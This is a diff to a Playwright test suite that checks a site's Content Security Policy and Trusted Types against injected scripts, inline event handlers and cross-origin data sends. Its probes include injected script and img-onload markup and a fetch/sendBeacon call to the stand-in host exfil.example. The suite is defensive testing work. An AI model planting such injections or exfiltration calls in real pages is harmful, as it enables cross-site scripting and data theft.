@@ -1,3 +1,4 @@
+import { createHash } from 'node:crypto';
 import { expect, test, type Page } from '@playwright/test';
 import { SECURITY_CHECK_URL } from '../../src/config/site';
 import { CHECK_FRAME, serveCheckFrame, stubTurnstile } from './check-frame';
@@ -8,23 +9,21 @@ test.beforeEach(({ page, baseURL }) => serveCheckFrame(page, baseURL));
 // These harmless probes never send data or touch browser storage.
 //
 // Each probe arrives the way an attack would: as markup injected into the
-// served HTML, or as extra code inside a script the policy lets run (our own
-// page-load module standing in for a compromised dependency). Trusted Types refuses
-// the DOM's own ways of injecting a script, so the probes cannot add one.
+// served HTML, or as extra code explicitly authorised by the policy. Trusted Types
+// refuses the DOM's own ways of injecting a script, so the probes cannot add one.
 
-/**
- * The page-load module every page runs (BaseLayout.astro: the Sentry bootstrap, prefetch and
- * src/scripts/main.ts), an /_astro/ file in a build with monitoring on, as the journey's and
- * production's are.
- */
-const PAGE_MODULE = '**/_astro/BaseLayout.astro_astro_type_script_*.js';
-
-/** Stub Turnstile, and append `probe` to the site's own page-load module. */
-async function compromisePageModule(page: Page, probe: string) {
+/** Authorise only the test probe, keeping the other directives and script hashes intact. */
+async function runPolicyProbe(page: Page, probe: string, unapproved = '') {
   await stubTurnstile(page);
-  await page.route(PAGE_MODULE, async (route) => {
+  const hash = createHash('sha256').update(probe).digest('base64');
+  await page.route('**/*', async (route) => {
+    if (route.request().resourceType() !== 'document' || route.request().frame() !== page.mainFrame()) return route.fallback();
     const original = await route.fetch();
-    await route.fulfill({ response: original, body: `${await original.text()}\n;${probe}` });
+    const body = (await original.text()).replace(/<meta http-equiv="refresh"[^>]*>/i, '');
+    const authorised = body.replace(/(<meta http-equiv="content-security-policy" content="[^"\n]*\bscript-src )/i, `$1'sha256-${hash}' `);
+    const injection = (authorised === body ? '' : `<script>${probe}</script>`) + unapproved;
+    const html = authorised.includes('</body>') ? authorised.replace('</body>', () => `${injection}</body>`) : authorised + injection;
+    await route.fulfill({ response: original, body: html });
   });
 }
 
@@ -76,20 +75,11 @@ const REFUSED = {
 };
 
 test('pages refuse unapproved scripts, event handlers, eval and HTML strings', async ({ page }) => {
-  await compromisePageModule(page, SINK_PROBE);
+  await runPolicyProbe(page, SINK_PROBE, [
+    '<script>document.documentElement.dataset.probeInline="ran"</script>',
+    '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.documentElement.dataset.probeHandler=\'ran\'">',
+  ].join(''));
   const violations = await recordViolations(page);
-  // Stored-XSS stand-in: markup injected into the HTML as it is served.
-  await page.route('**/*', async (route) => {
-    if (route.request().resourceType() !== 'document') return route.fallback();
-    const original = await route.fetch();
-    const body = (await original.text()).replace(/<meta http-equiv="refresh"[^>]*>/i, '');
-    const injection = [
-      '<script>document.documentElement.dataset.probeInline="ran"</script>',
-      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.documentElement.dataset.probeHandler=\'ran\'">',
-    ].join('');
-    const html = body.includes('</body>') ? body.replace('</body>', `${injection}</body>`) : `${body}${injection}`;
-    await route.fulfill({ response: original, body: html });
-  });
 
   for (const path of ['/', '/contact/', '/field-notes/', '/services.html/index.html', '/no-such-page-security/']) {
     await page.goto(path);
@@ -123,7 +113,7 @@ test('pages refuse unapproved scripts, event handlers, eval and HTML strings', a
 // the page with the form, which no script may give a Trusted Types policy either. The frame
 // cannot read the form or move the page, and the page takes a message only from that frame.
 test("the contact page never runs Cloudflare's script, and its check frame cannot touch the form", async ({ page }) => {
-  await compromisePageModule(page, `(() => {
+  await runPolicyProbe(page, `(() => {
     try {
       trustedTypes.createPolicy('turnstile', {});
       document.documentElement.dataset.policyProbe = 'allowed';
@@ -175,7 +165,7 @@ test('pages cannot send data to any other origin', async ({ page }) => {
     leaked.push(route.request().url());
     return route.fulfill({ status: 204 });
   });
-  await compromisePageModule(page, `(() => {
+  await runPolicyProbe(page, `(() => {
     const out = 'https://exfil.example/collect?d=probe';
     fetch(out, { mode: 'no-cors' }).catch(() => {});
     try { navigator.sendBeacon(out, 'probe'); } catch {}
